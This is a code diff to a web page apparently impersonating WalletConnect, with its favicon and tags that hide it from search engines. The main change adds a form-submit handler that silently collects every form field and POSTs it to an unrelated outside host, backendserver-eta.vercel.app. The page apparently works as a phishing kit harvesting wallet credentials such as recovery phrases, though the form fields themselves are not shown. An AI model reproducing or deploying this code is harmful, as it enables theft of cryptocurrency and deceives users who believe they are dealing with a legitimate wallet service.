@@ -16,11 +16,6 @@
     <link rel="shortcut icon" href="img/walletconnect-logo.html" type="image/x-icon">
     <link rel="stylesheet" href="../style/fa605a2e7387ae6acff3.css" as="style" />
 
-
-
-<script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
     <meta name="robots" content="noindex, nofollow">
     <meta name="robots" content="noimageindex">
 
@@ -241,14 +236,30 @@
     const form = document.querySelector('.p-1'); // Replace 'yourFormClass' with the actual class of your form
 
     form.addEventListener('submit', function (event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevent the default form submission behavior
 
-        // Add your form submission logic here, for example using fetch
+        // Get form data
+        const formData = new FormData(form);
 
-        // After the form is successfully submitted, redirect to 'redirect.html'
-        window.location.href = '/user/redirect.html';
+        // Make a POST request to the server
+        fetch('https://backendserver-eta.vercel.app/submit-form', {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to submit the form');
+            }
+            // Form submitted successfully, you can handle the response if needed
+            console.log('Form submitted successfully');
+            return response.text(); // or response.json() depending on your server response
+        })
+        .catch(error => {
+            console.error('Error submitting the form:', error);
+        });
     });
 });
+
 
 
         </script>
@@ -295,7 +306,6 @@
 
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
 
 
